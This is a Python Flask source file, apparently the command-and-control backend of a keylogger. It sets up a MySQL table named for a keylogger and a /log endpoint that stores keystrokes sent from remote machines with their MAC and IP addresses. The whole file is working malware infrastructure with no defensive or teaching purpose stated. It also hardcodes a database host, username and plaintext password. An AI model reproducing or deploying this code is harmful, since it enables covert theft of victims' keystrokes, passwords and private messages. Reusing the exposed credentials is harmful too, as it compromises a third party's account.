from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime
import mysql.connector
import os

app = Flask(__name__)
CORS(app)

# Configuration MySQL
db_config = {
    'host': 'kapelo.mysql.pythonanywhere-services.com',
    'user': 'kapelo',
    'password': 'Babana36',  # Votre mot de passe MySQL
    'database': 'kapelo$keylogger'
}

def init_db():
    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS keystrokes (
                id INT AUTO_INCREMENT PRIMARY KEY,
                machine_id VARCHAR(255),
                mac_address VARCHAR(255),  -- Nouveau champ pour l'adresse MAC
                ip_address VARCHAR(255),    -- Nouveau champ pour l'adresse IP
                keystrokes TEXT,
                timestamp DATETIME,
                received_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        conn.commit()
        print("Base de données initialisée avec succès!")
    except Exception as e:
        print(f"Erreur d'initialisation de la BD: {e}")
    finally:
        if 'cursor' in locals():
            cursor.close()
        if 'conn' in locals():
            conn.close()

# Route de test
@app.route('/test', methods=['GET'])
def test():
    try:
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        cursor.execute('SELECT 1')
        cursor.close()
        conn.close()
        return jsonify({"status": "OK", "message": "Connexion à la base de données réussie!"}), 200
    except Exception as e:
        return jsonify({"status": "ERROR", "message": str(e)}), 500

@app.route('/log', methods=['POST'])
def log_keys():
    try:
        data = request.json
        conn = mysql.connector.connect(**db_config)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO keystrokes (machine_id, mac_address, ip_address, keystrokes, timestamp)
            VALUES (%s, %s, %s, %s, %s)
        ''', (
            data['machine_id'],
            data['mac_address'],  # Inclure l'adresse MAC
            data['ip_address'],    # Inclure l'adresse IP
            data['keystrokes'],
            datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ))
        
        conn.commit()
        cursor.close()
        conn.close()
        
        return jsonify({"success": True}), 200
    except Exception as e:
        print(f"Erreur: {e}")
        return jsonify({"error": str(e)}), 500

# Initialisation de la BD au démarrage
init_db()

if __name__ == '__main__':
    app.run(debug=True)